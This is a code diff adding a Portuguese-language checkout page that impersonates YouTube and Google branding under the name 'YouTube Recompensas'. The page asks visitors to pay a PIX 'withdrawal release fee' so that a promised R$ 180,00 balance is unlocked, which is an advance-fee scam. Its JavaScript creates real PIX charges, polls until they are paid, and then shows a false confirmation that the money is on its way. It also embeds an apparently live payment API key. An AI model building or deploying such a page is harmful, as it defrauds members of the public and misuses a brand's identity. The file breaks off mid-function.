@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YouTube Recompensas — Liberar Saque</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    /* ════════════════════════════════════════════
+       GOOGLE / YOUTUBE DESIGN SYSTEM
+    ════════════════════════════════════════════ */
+    :root {
+      --yt-red:        #FF0000;
+      --yt-red-dark:   #CC0000;
+      --g-blue:        #4285F4;
+      --g-green:       #34A853;
+      --g-yellow:      #FBBC05;
+      --g-red:         #EA4335;
+      --surface:       #FFFFFF;
+      --surface-2:     #F8F9FA;
+      --surface-3:     #F1F3F4;
+      --border:        #DADCE0;
+      --text-primary:  #202124;
+      --text-secondary:#5F6368;
+      --text-muted:    #9AA0A6;
+      --shadow-1: 0 1px 2px rgba(60,64,67,.3), 0 1px 3px rgba(60,64,67,.15);
+      --shadow-2: 0 1px 4px rgba(60,64,67,.3), 0 2px 6px rgba(60,64,67,.15);
+      --shadow-3: 0 4px 8px rgba(60,64,67,.3), 0 0 0 1px rgba(60,64,67,.04);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
+      background: var(--surface-2);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── TOP BAR ── */
+    .yt-topbar {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 0 24px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: var(--shadow-1);
+    }
+
+    .yt-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+    }
+
+    .yt-logo-icon {
+      width: 90px;
+      height: 20px;
+    }
+
+    .yt-logo-label {
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--text-secondary);
+      border-left: 1px solid var(--border);
+      padding-left: 10px;
+      margin-left: 4px;
+    }
+
+    .yt-topbar-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .secure-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--text-secondary);
+    }
+
+    .secure-badge svg { color: var(--g-green); }
+
+    /* ── PROGRESS BAR ── */
+    .yt-progress-bar {
+      height: 3px;
+      background: var(--border);
+      position: relative;
+    }
+    .yt-progress-fill {
+      height: 100%;
+      background: var(--yt-red);
+      width: 100%;
+      transition: width 0.4s ease;
+    }
+
+    /* ── MAIN LAYOUT ── */
+    main {
+      flex: 1;
+      max-width: 900px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 24px 16px 60px;
+      display: grid;
+      grid-template-columns: 1fr 360px;
+      gap: 20px;
+      align-items: start;
+    }
+
+    @media (max-width: 720px) {
+      main { grid-template-columns: 1fr; }
+      .order-sidebar { order: -1; }
+    }
+
+    /* ── GOOGLE CARD ── */
+    .g-card {
+      background: var(--surface);
+      border-radius: 8px;
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-1);
+      overflow: hidden;
+    }
+
+    .g-card-header {
+      padding: 18px 20px 14px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .g-card-header h2 {
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      font-size: 15px;
+      font-weight: 500;
+      color: var(--text-primary);
+    }
+
+    .g-card-body { padding: 20px; }
+
+    /* ── STEP INDICATOR ── */
+    .steps-row {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .step-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      font-weight: 500;
+    }
+
+    .step-circle {
+      width: 24px; height: 24px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .step-item.done .step-circle   { background: var(--g-green); color: #fff; }
+    .step-item.active .step-circle { background: var(--yt-red);  color: #fff; }
+    .step-item.idle .step-circle   { background: var(--surface-3); color: var(--text-muted); border: 1.5px solid var(--border); }
+    .step-item.done .step-label    { color: var(--g-green); }
+    .step-item.active .step-label  { color: var(--yt-red); font-weight: 700; }
+    .step-item.idle .step-label    { color: var(--text-muted); }
+
+    .step-line {
+      flex: 1;
+      height: 2px;
+      background: var(--border);
+      margin: 0 8px;
+    }
+    .step-line.done { background: var(--g-green); }
+
+    /* ── ALERT BANNER ── */
+    .alert-banner {
+      background: #FEF7E0;
+      border: 1px solid #F6D14A;
+      border-radius: 6px;
+      padding: 10px 14px;
+      font-size: 12.5px;
+      color: #7A5800;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    /* ── PIX SECTION ── */
+    #pix-loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      padding: 40px 20px;
+      color: var(--text-secondary);
+      font-size: 14px;
+    }
+
+    .g-spinner {
+      width: 40px; height: 40px;
+      border: 3px solid var(--border);
+      border-top-color: var(--g-blue);
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    #pix-content { display: none; }
+
+    .pix-layout {
+      display: flex;
+      gap: 20px;
+      align-items: flex-start;
+    }
+
+    @media (max-width: 480px) {
+      .pix-layout { flex-direction: column; align-items: center; }
+    }
+
+    .pix-qr-wrap {
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .pix-qr-frame {
+      width: 160px; height: 160px;
+      border: 2px solid var(--border);
+      border-radius: 8px;
+      background: #fff;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .pix-qr-frame img {
+      width: 100%; height: 100%;
+      object-fit: contain;
+    }
+
+    .pix-amount-pill {
+      background: var(--surface-3);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 4px 14px;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--text-primary);
+    }
+
+    .pix-right { flex: 1; }
+
+    .pix-steps-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .pix-steps-list li {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 13px;
+      color: var(--text-secondary);
+      line-height: 1.5;
+    }
+
+    .pix-step-num {
+      width: 20px; height: 20px;
+      border-radius: 50%;
+      background: var(--g-blue);
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* ── COPY FIELD ── */
+    .copy-field {
+      background: var(--surface-2);
+      border: 1.5px solid var(--border);
+      border-radius: 6px;
+      padding: 10px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+    }
+
+    .copy-field-text {
+      font-size: 11px;
+      font-family: 'Roboto Mono', monospace;
+      color: var(--text-secondary);
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      flex: 1;
+    }
+
+    .btn-copy-g {
+      background: none;
+      border: 1px solid var(--g-blue);
+      color: var(--g-blue);
+      font-family: 'Roboto', sans-serif;
+      font-size: 12px;
+      font-weight: 500;
+      padding: 5px 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: background 0.15s, color 0.15s;
+    }
+
+    .btn-copy-g:hover { background: rgba(66,133,244,0.08); }
+    .btn-copy-g.copied { border-color: var(--g-green); color: var(--g-green); }
+
+    /* ── TIMER ── */
+    .pix-timer-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 14px;
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+
+    .pix-timer-val {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--g-red);
+      font-family: 'Roboto Mono', monospace;
+    }
+
+    /* ── POLLING STATUS ── */
+    .polling-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 16px;
+      padding: 10px 14px;
+      background: #E8F0FE;
+      border-radius: 6px;
+      font-size: 12.5px;
+      color: #1A73E8;
+      font-weight: 500;
+    }
+
+    .poll-dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: var(--g-blue);
+      animation: pulse-dot 1.5s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes pulse-dot {
+      0%,100% { opacity: 1; transform: scale(1); }
+      50%      { opacity: 0.4; transform: scale(0.7); }
+    }
+
+    /* ── SUCCESS SCREEN ── */
+    #success-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      padding: 48px 24px;
+      text-align: center;
+    }
+
+    .success-icon {
+      width: 72px; height: 72px;
+      border-radius: 50%;
+      background: var(--g-green);
+      display: flex; align-items: center; justify-content: center;
+      animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+
+    .success-icon svg { width: 36px; height: 36px; stroke: #fff; }
+
+    .success-title {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 22px;
+      font-weight: 500;
+      color: var(--text-primary);
+    }
+
+    .success-subtitle {
+      font-size: 14px;
+      color: var(--text-secondary);
+      max-width: 320px;
+      line-height: 1.6;
+    }
+
+    .success-amount {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 36px;
+      font-weight: 700;
+      color: var(--g-green);
+    }
+
+    /* ── ERROR SCREEN ── */
+    #error-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      padding: 32px 20px;
+      text-align: center;
+    }
+
+    .error-icon {
+      font-size: 40px;
+    }
+
+    .error-title {
+      font-size: 16px;
+      font-weight: 500;
+      color: var(--g-red);
+    }
+
+    .error-msg {
+      font-size: 13px;
+      color: var(--text-secondary);
+      max-width: 280px;
+      line-height: 1.5;
+    }
+
+    .btn-retry {
+      background: var(--g-red);
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 9px 20px;
+      font-family: 'Roboto', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .btn-retry:hover { background: #C5221F; }
+
+    /* ── ORDER SIDEBAR ── */
+    .order-sidebar {}
+
+    .order-summary-title {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 15px;
+      font-weight: 500;
+    }
+
+    .order-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 14px 0;
+      border-bottom: 1px solid var(--border);
+      gap: 12px;
+    }
+
+    .order-item:last-child { border-bottom: none; }
+
+    .order-item-info {}
+    .order-item-name { font-size: 13px; font-weight: 500; color: var(--text-primary); }
+    .order-item-desc { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
+
+    .order-item-price {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--text-primary);
+      white-space: nowrap;
+    }
+
+    .order-item-price .original {
+      font-size: 11px;
+      color: var(--text-muted);
+      text-decoration: line-through;
+      font-weight: 400;
+      display: block;
+      text-align: right;
+    }
+
+    .order-total-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-top: 14px;
+      border-top: 2px solid var(--text-primary);
+      margin-top: 4px;
+    }
+
+    .order-total-label {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .order-total-val {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--g-green);
+    }
+
+    .discount-badge {
+      display: inline-flex;
+      align-items: center;
+      background: #E6F4EA;
+      color: #137333;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 20px;
+      margin-left: 6px;
+    }
+
+    /* Guarantee list */
+    .guarantee-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .guarantee-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .guarantee-icon {
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      font-size: 16px;
+    }
+
+    .guarantee-icon.green { background: #E6F4EA; }
+    .guarantee-icon.blue  { background: #E8F0FE; }
+    .guarantee-icon.yellow{ background: #FEF7E0; }
+
+    .guarantee-text {}
+    .guarantee-text strong { font-size: 13px; font-weight: 500; display: block; }
+    .guarantee-text span   { font-size: 12px; color: var(--text-secondary); }
+
+    /* ── FOOTER ── */
+    footer {
+      background: var(--surface);
+      border-top: 1px solid var(--border);
+      padding: 16px 24px;
+      text-align: center;
+      font-size: 11px;
+      color: var(--text-muted);
+    }
+
+    /* ── CONFETTI ── */
+    .confetti-p {
+      position: fixed;
+      width: 8px; height: 12px;
+      border-radius: 2px;
+      animation: cfall 3.5s linear both;
+      pointer-events: none;
+      z-index: 9999;
+    }
+    @keyframes cfall {
+      0%   { transform: translateY(-20px) rotate(0deg); opacity:1; }
+      100% { transform: translateY(110vh) rotate(450deg); opacity:0; }
+    }
+
+    /* ── API KEY CONFIG ── */
+    .apikey-notice {
+      background: #FEF7E0;
+      border: 1.5px dashed #F6D14A;
+      border-radius: 8px;
+      padding: 14px 18px;
+      font-size: 13px;
+      color: #7A5800;
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .apikey-notice strong { font-size: 14px; }
+
+    .apikey-input-row {
+      display: flex;
+      gap: 8px;
+    }
+
+    .apikey-input {
+      flex: 1;
+      background: #fff;
+      border: 1px solid #F6D14A;
+      border-radius: 4px;
+      padding: 8px 12px;
+      font-family: 'Roboto Mono', monospace;
+      font-size: 12px;
+      color: var(--text-primary);
+      outline: none;
+    }
+
+    .apikey-input:focus { border-color: var(--g-blue); }
+
+    .btn-set-key {
+      background: var(--g-blue);
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 16px;
+      font-family: 'Roboto', sans-serif;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .btn-set-key:hover { background: #1A73E8; }
+  </style>
+</head>
+<body>
+
+<div id="confetti-wrapper" style="position:fixed;inset:0;pointer-events:none;z-index:9999;overflow:hidden;"></div>
+
+<!-- TOP BAR -->
+<header class="yt-topbar">
+  <a class="yt-logo" href="index.html">
+    <svg class="yt-logo-icon" viewBox="0 0 90 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M35.5 3.5C35.5 3.5 35.2 2.1 34.6 1.5C33.8 0.7 32.9 0.6 32.5 0.6C27.2 0.2 19.3 0.2 19.3 0.2H19.2C19.2 0.2 11.3 0.2 6 0.6C5.6 0.6 4.7 0.7 3.9 1.5C3.3 2.1 3 3.5 3 3.5C3 3.5 2.7 5.1 2.7 6.7V8.2C2.7 9.8 3 11.4 3 11.4C3 11.4 3.3 12.8 3.9 13.4C4.7 14.2 5.7 14.2 6.2 14.3C7.8 14.4 13.3 14.5 19.2 14.5C19.2 14.5 27.2 14.5 32.5 14C32.9 13.9 33.8 13.9 34.6 13.1C35.2 12.5 35.5 11.1 35.5 11.1C35.5 11.1 35.8 9.5 35.8 7.9V6.4C35.8 4.8 35.5 3.2 35.5 3.2V3.5Z" fill="#FF0000"/>
+      <path d="M15.2 10.1V4.3L21.8 7.2L15.2 10.1Z" fill="white"/>
+      <path d="M41.5 13.2L39.3 5H41.1L42.5 10.7L43.9 5H45.7L43.4 13.2H41.5Z" fill="#282828"/>
+      <path d="M49.1 13.3C48.4 13.3 47.8 13.1 47.4 12.7C47 12.3 46.7 11.7 46.7 11V7.5H48.4V10.8C48.4 11.5 48.7 11.8 49.2 11.8C49.7 11.8 50.1 11.5 50.4 11V7.5H52.1V13.2H50.6L50.5 12.4C50.1 13 49.7 13.3 49.1 13.3Z" fill="#282828"/>
+      <path d="M55.4 13.2V6.3H53.5V5H57.2V13.2H55.4Z" fill="#282828"/>
+      <path d="M60.3 13.2V6.3H58.4V5H62.1V13.2H60.3Z" fill="#282828"/>
+    </svg>
+    <span class="yt-logo-label">Checkout</span>
+  </a>
+  <div class="yt-topbar-right">
+    <div class="secure-badge">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#34A853" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Pagamento Seguro
+    </div>
+  </div>
+</header>
+
+<div class="yt-progress-bar"><div class="yt-progress-fill"></div></div>
+
+<main>
+  <!-- LEFT COLUMN -->
+  <div>
+    <!-- Step Indicator -->
+    <div class="steps-row" style="padding: 0 4px; margin-bottom: 20px;">
+      <div class="step-item done">
+        <div class="step-circle">✓</div>
+        <span class="step-label">Pesquisa</span>
+      </div>
+      <div class="step-line done"></div>
+      <div class="step-item done">
+        <div class="step-circle">✓</div>
+        <span class="step-label">Vídeo</span>
+      </div>
+      <div class="step-line done"></div>
+      <div class="step-item active">
+        <div class="step-circle">3</div>
+        <span class="step-label">Liberação</span>
+      </div>
+    </div>
+
+    <!-- API Key Config (hidden when key is set) -->
+    <div class="apikey-notice" id="apikey-notice">
+      <strong>🔑 Configure sua API Key NexusPag</strong>
+      <p>Para gerar o PIX real, insira sua API Key abaixo:</p>
+      <div class="apikey-input-row">
+        <input type="text" class="apikey-input" id="apikey-input" placeholder="nxp_live_...">
+        <button class="btn-set-key" onclick="setApiKey()">Confirmar</button>
+      </div>
+    </div>
+
+    <!-- PIX Card -->
+    <div class="g-card">
+      <div class="g-card-header">
+        <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M400.2 362.1l-67.2-67.2c-12.8-12.8-33.5-12.8-46.3 0l-56.6 56.6-114.8-114.8 56.6-56.6c12.8-12.8 12.8-33.5 0-46.3L104.7 66.6C91.9 53.8 71.2 53.8 58.4 66.6L29.6 95.4c-37.1 37.1-39.5 96.3-6.4 136.1l14.8 17.6L256 467.1l14.7 17.7c40 33.3 99.1 30.8 136.4-6.4l28.8-28.8c12.8-12.8 12.8-33.5.3-46.3L400.2 362.1z" fill="#32BCAD"/>
+          <path d="M422.6 256l-166.5-166.5 23.1-23.1c12.8-12.8 33.5-12.8 46.3 0l67.2 67.2c12.8 12.8 12.8 33.5 0 46.3l-23.1 23.1L482.3 316c37.1-40 34.5-99.1-6.4-136.4l-17.7-14.8L240 347.2l17.7 14.8c36.3 30.2 89.6 31.7 127.5 3.7L422.6 256z" fill="#32BCAD"/>
+        </svg>
+        <h2>Pagar com PIX — Taxa de Liberação de Saque</h2>
+      </div>
+
+      <div class="g-card-body">
+        <div class="alert-banner">
+          <span>ℹ️</span>
+          <span>Esta é uma <strong>taxa única</strong> de liberação. Após o pagamento, seu saldo de <strong>R$ 180,00</strong> será transferido imediatamente para sua chave PIX.</span>
+        </div>
+
+        <!-- Loading state -->
+        <div id="pix-loading">
+          <div class="g-spinner"></div>
+          <span>Gerando seu QR Code PIX…</span>
+        </div>
+
+        <!-- PIX Content -->
+        <div id="pix-content">
+          <div class="pix-layout">
+            <div class="pix-qr-wrap">
+              <div class="pix-qr-frame">
+                <img id="pix-qr-img" src="" alt="QR Code PIX">
+              </div>
+              <div class="pix-amount-pill" id="pix-amount-label">R$ 1,00</div>
+            </div>
+            <div class="pix-right">
+              <ul class="pix-steps-list">
+                <li>
+                  <span class="pix-step-num">1</span>
+                  <span>Abra o app do seu banco e acesse a área <strong>PIX</strong></span>
+                </li>
+                <li>
+                  <span class="pix-step-num">2</span>
+                  <span>Toque em <strong>Ler QR Code</strong> ou <strong>PIX Copia e Cola</strong></span>
+                </li>
+                <li>
+                  <span class="pix-step-num">3</span>
+                  <span>Cole o código abaixo e confirme o pagamento de <strong id="pix-step-amount">R$ 1,00</strong></span>
+                </li>
+              </ul>
+
+              <div class="copy-field">
+                <span class="copy-field-text" id="pix-code-display">—</span>
+                <button class="btn-copy-g" id="btn-copy" onclick="copyCode()">Copiar</button>
+              </div>
+
+              <div class="pix-timer-row">
+                ⏳ Expira em: <span class="pix-timer-val" id="pix-timer">30:00</span>
+              </div>
+
+              <div class="polling-row">
+                <span class="poll-dot"></span>
+                Aguardando confirmação do pagamento…
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Success -->
+        <div id="success-screen">
+          <div class="success-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
+          </div>
+          <div class="success-title">Pagamento Confirmado! 🎉</div>
+          <div class="success-amount">R$ 180,00</div>
+          <div class="success-subtitle">
+            Seu saque foi aprovado e o PIX está sendo enviado para sua chave cadastrada. Prazo: <strong>até 2 minutos</strong>.
+          </div>
+          <button onclick="window.location.href='index.html'" style="margin-top:8px; background:var(--g-blue); color:#fff; border:none; border-radius:4px; padding:11px 24px; font-family:'Roboto',sans-serif; font-size:14px; font-weight:500; cursor:pointer;">
+            Voltar ao início
+          </button>
+        </div>
+
+        <!-- Error -->
+        <div id="error-screen">
+          <div class="error-icon">⚠️</div>
+          <div class="error-title" id="error-title">Erro ao gerar PIX</div>
+          <div class="error-msg" id="error-msg">Não foi possível conectar à API. Verifique sua API Key e tente novamente.</div>
+          <button class="btn-retry" onclick="location.reload()">Tentar novamente</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- RIGHT SIDEBAR -->
+  <div class="order-sidebar">
+    <div class="g-card" style="margin-bottom:16px;">
+      <div class="g-card-header">
+        <h2 class="order-summary-title">Resumo do pedido</h2>
+      </div>
+      <div class="g-card-body" style="padding-bottom:0;">
+        <div class="order-item">
+          <div class="order-item-info">
+            <div class="order-item-name">Taxa de Liberação de Saque</div>
+            <div class="order-item-desc">Única cobrança · sem mensalidade</div>
+          </div>
+          <div class="order-item-price">
+            <span class="original">R$ 29,90</span>
+            R$ 1,00
+          </div>
+        </div>
+        <div class="order-item">
+          <div class="order-item-info">
+            <div class="order-item-name" style="color:var(--g-green);">Desconto especial</div>
+            <div class="order-item-desc">Oferta por tempo limitado</div>
+          </div>
+          <div class="order-item-price" style="color:var(--g-green);">- R$ 28,90</div>
+        </div>
+        <div class="order-total-row">
+          <span class="order-total-label">Total <span class="discount-badge">96% OFF</span></span>
+          <span class="order-total-val">R$ 1,00</span>
+        </div>
+        <div style="padding: 14px 0; font-size:12px; color:var(--text-secondary); line-height:1.6;">
+          Após confirmar o pagamento, seu saldo de <strong>R$ 180,00</strong> será liberado automaticamente.
+        </div>
+      </div>
+    </div>
+
+    <div class="g-card">
+      <div class="g-card-header">
+        <h2>Por que pagar essa taxa?</h2>
+      </div>
+      <div class="g-card-body">
+        <div class="guarantee-list">
+          <div class="guarantee-item">
+            <div class="guarantee-icon green">✅</div>
+            <div class="guarantee-text">
+              <strong>Verificação de identidade</strong>
+              <span>Confirma que o saque vai para o titular correto da conta.</span>
+            </div>
+          </div>
+          <div class="guarantee-item">
+            <div class="guarantee-icon blue">🔒</div>
+            <div class="guarantee-text">
+              <strong>Segurança antifraude</strong>
+              <span>Protege seu saldo contra transferências não autorizadas.</span>
+            </div>
+          </div>
+          <div class="guarantee-item">
+            <div class="guarantee-icon yellow">⚡</div>
+            <div class="guarantee-text">
+              <strong>Saque instantâneo</strong>
+              <span>PIX processado em até 2 minutos após confirmação.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer>
+  <div style="margin-bottom:6px;">
+    🔐 Transação criptografada com SSL 256-bit &nbsp;·&nbsp; Processado via NexusPag
+  </div>
+  © 2026 YouTube LLC · Todos os direitos reservados ·
+  <a href="#" style="color:inherit;">Termos</a> ·
+  <a href="#" style="color:inherit;">Privacidade</a>
+</footer>
+
+<script>
+// ════════════════════════════════════
+//  CONFIG — preencha sua API Key
+// ════════════════════════════════════
+const CONFIG = {
+  apiBase:  'https://nexuspag.com',
+  apiKey:   'nxp_live_08eadbcdd89de1f90091deb4f536f2d044a4ec13d6e43b0b5d4dc46ec692b4d6',
+  amount:   1.00,          // R$ 1,00 para testes
+  description: 'Taxa de liberação — YouTube Recompensas',
+  externalId: 'yt-saque-' + Date.now(),
+  pollInterval: 3000,      // consultar a cada 3s
+  maxPolls: 600,           // 30 min máx
+};
+
+// ── Estado ──
+let pixData     = null;
+let pollTimer   = null;
+let pollCount   = 0;
+let timerSec    = 1800;
+let timerHandle = null;
+
+// ── Elementos ──
+const elLoading  = document.getElementById('pix-loading');
+const elContent  = document.getElementById('pix-content');
+const elSuccess  = document.getElementById('success-screen');
+const elError    = document.getElementById('error-screen');
+const elApiNote  = document.getElementById('apikey-notice');
+
+// ════════════════════════════════════
+//  INIT
+// ════════════════════════════════════
+window.addEventListener('DOMContentLoaded', () => {
+  elApiNote.style.display = 'none';
+  createPixCharge();
+});
+
+// ── Salvar API Key ──
+function setApiKey() {
+  const val = document.getElementById('apikey-input').value.trim();
+  if (!val) { alert('Cole sua API Key primeiro.'); return; }
+  CONFIG.apiKey = val;
+  localStorage.setItem('nexus_api_key', val);
+  elApiNote.style.display = 'none';
+  createPixCharge();
+}
+
+// ════════════════════════════════════
+//  1. CRIAR COBRANÇA PIX
+// ════════════════════════════════════
+async function createPixCharge() {
+  showState('loading');
+
+  try {
+    let res;
+    try {
+      res = await fetch(`${CONFIG.apiBase}/api/pix/create`, {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+          'x-api-key':    CONFIG.apiKey,
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          amount:      CONFIG.amount,
+          description: CONFIG.description,
+          external_id: CONFIG.externalId,
+          expiration:  1800,
+        }),
+      });
+    } catch (networkErr) {
+      // CORS ou sem internet
+      throw new Error(
+        'Não foi possível conectar à API NexusPag. ' +
+        'Isso pode ser bloqueio CORS ao abrir o arquivo local. ' +
+        'Tente hospedar o site em um servidor HTTP (ex: extenso Live Server no VS Code). ' +
+        'Detalhe técnico: ' + networkErr.message
+      );
+    }
+
+    let data;
+    try {
+      data = await res.json();
+    } catch (_) {
+      throw new Error(`Resposta inválida da API (status ${res.status})`);
+    }
+
+    if (!res.ok) {
+      const msg = data?.message || data?.error || JSON.stringify(data);
+      throw new Error(`API retornou erro ${res.status}: ${msg}`);
+    }
+
+    if (!data.transaction) {
+      throw new Error('Resposta inesperada da API: campo transaction ausente.');
+    }
+
+    pixData = data.transaction;
+    renderPix(pixData);
+    showState('pix');
+    startTimer(pixData.expires_at);
+    startPolling(pixData.id);
+
+  } catch (err) {
+    console.error('PIX create error:', err);
+    document.getElementById('error-title').textContent = '⚠️ Erro ao gerar PIX';
+    document.getElementById('error-msg').textContent = err.message;
+    showState('error');
+  }
+}
+
+// ════════════════════════════════════
+//  2. RENDERIZAR QR CODE
+// ════════════════════════════════════
+function renderPix(tx) {
+  // QR code (base64 da API)
+  if (tx.qr_code_base64) {
+    document.getElementById('pix-qr-img').src = tx.qr_code_base64;
+  }
+
+  // Código copia e cola
+  const code = tx.pix_copia_cola || '';
+  const display = document.getElementById('pix-code-display');
+  display.textContent = code.length > 40 ? code.slice(0, 40) + '…' : code;
+  display.dataset.full = code;
+
+  // Valor
+  const fmt = 'R$ ' + (tx.amount || CONFIG.amount).toFixed(2).replace('.', ',');
+  document.getElementById('pix-amount-label').textContent = fmt;
+  document.getElementById('pix-step-amount').textContent  = fmt;
+}
+
+// ════════════════════════════════════
+//  3. POLLING — verificar pagamento
+// ════════════════════════════════════
+function startPolling(txId) {
+  pollTimer = setInterval(async () => {
+    pollCount++;
+    if (pollCount > CONFIG.maxPolls) { clearInterval(pollTimer); return; }
+
+    try {
+      const res  = await fetch(`${CONFIG.apiBase}/api/pix/${txId}`, {
+        headers: { 'x-api-key': CONFIG.apiKey, 'Accept': 'application/json' },
+      });
+
+      if (!res.ok) return;
+
+      const tx = await res.json();
+
+      if (tx.status === 'paid') {
+        clearInterval(pollTimer);
+        clearInterval(timerHandle);
+        showSuccess();
+      } else if (tx.status === 'expired' || tx.status === 'cancelled') {
+        clearInterval(pollTimer);
+        clearInterval(timerHandle);
+        document.getElementById('error-title').textContent = 'PIX expirado';
+        document.getElementById('error-msg').textContent = 'O QR Code expirou. Clique em "Tentar novamente" para gerar um novo.';
+        showState('error');
+      }
+    } catch (_) {}
+  }, CONFIG.pollInterval);
+}
+
+// ════════════════════════════════════
+//  TIMER COUNTDOWN
+// ════════════════════════════════════
+function startTimer(expiresAt) {
+  if (expiresAt) {
+    const diff = Math.floor((new Date(expiresAt) - Date.now()) / 1000);
+    if (diff > 0) timerSec = diff;
+  }
+
+  updateTimer();
+  timerHandle = setInterval(() => {
+    timerSec--;
+    if (timerSec <= 0) { clearInterval(timerHandle); timerSec = 0; }
+    updateTimer();
+  }, 1000);
+}
+
+function updateTimer() {
+  const m = Math.floor(timerSec / 60);
+  const s = timerSec % 60;
+  document.getElementById('pix-timer').textContent =
+    `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+}
+
+// ════════════════════════════════════
+//  COPIAR CÓDIGO
+// ════════════════════════════════════
+function copyCode() {
+  const el  = document.getElementById('pix-code-display');
